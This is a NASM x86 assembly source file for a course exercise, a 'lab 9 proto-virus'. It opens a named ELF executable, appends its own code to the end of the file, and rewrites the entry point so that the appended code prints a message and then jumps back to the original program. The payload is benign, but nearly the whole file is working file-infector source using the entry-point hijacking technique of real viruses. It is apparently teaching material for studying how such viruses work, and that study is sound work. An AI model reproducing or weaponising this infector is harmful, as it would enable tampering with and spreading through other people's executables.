%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
	cmp eax, -1					;checking error
	jle	fail						; eax >= -1
		
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 	52
%define ELFHDR_phoff	28
%define fd dword [ebp-4]
	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	open_file:
		open FileName, RDWR, 0777	; eax = open(filename, read|write, permissions for everywhere);
		mov fd, eax				;eax = fd

	compare_magic_numbers:
		read fd, ebp, 4			; eax = read first 4 bytes from fd to ebp;
		cmp dword[ebp], 0x464C457F	; 0x464C457F is the magic number =ELF ?
		jne fail

	save_previous_entry:
		lseek fd, 0x18, SEEK_SET			; using lseek to jump to entry location of entry point(offset 18 bytes)
		read fd, previous_entry_point, 4		; read the entry point and save it in a location predefined

	infect:
		lseek fd, 0, SEEK_END				; SEEK_END is the end of file
		mov esi, eax					; put the end location of the file in esi(which is the file
		write fd, virus_start, virus_end - virus_start	; write to the end of the given file all the code from "virus_start" (which is the code that prints the file)

	new_virtual_address:
		lseek fd, 0x3C, SEEK_SET			; location of virtual adress of text
		read fd, ebp, 4					; read the virtual address
		add esi, dword[ebp]				; program virtual address + file size = virus virtual address(end of file not including virus)
		mov dword[new_entry_point], esi			; saved the virtual address


	change_entry_point:
		lseek fd, 0x18, SEEK_SET		; using lseek to jump to entry location of entry point(offset 18 bytes)
		write fd, new_entry_point, 4		; overwrite the previous entry point
		write 1, OutStr, 31				; print OutStr string
	set_variable_PreviousEntryPoint:
		lseek fd, -4, SEEK_END			; last 4 bytes in the virus is PreviousEntryPoint, we plan on changing it to the old entry point 
		write fd, previous_entry_point, 4	; save the previous entry point at the PreviousEntryPoint
		jmp VirusExit						; exit
	    						

	fail:
		write 2, Failstr, 12			; print FailStr string
		close fd				;close file
		jmp VirusExit					; exit


VirusExit:
	close fd
        exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)


virus_start:
	print_sucess: 	; because we are adding this to a file, we want to dynamically calculate the new address for the OutStr
		call get_my_loc					; ecx = next_i's address
		sub ecx, next_i-OutStr				; ecx = OutStr's address
		write 1, ecx, 31				; print OutStr string to stdout
	
	get_back_to_old_entry_point:
		call get_my_loc					; ecx = next_i's address
		sub ecx, next_i-PreviousEntryPoint	; ecx = PreviousEntryPoint's address, this is where we saved the previous entry point (see line 95)
		jmp [ecx]						; jump back to the previous entry point to run the code normally


FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
works_string: db "it works!", 10, 0
	
get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:




section .bss			 ;uninitialized data segment
var: resd 1			;saves one double word of storage space in the BSS
previous_entry_point: resd 1    ;saves one double word of storage space in the BSS
new_entry_point: resd 1 	;saves one double word of storage space in the BSS
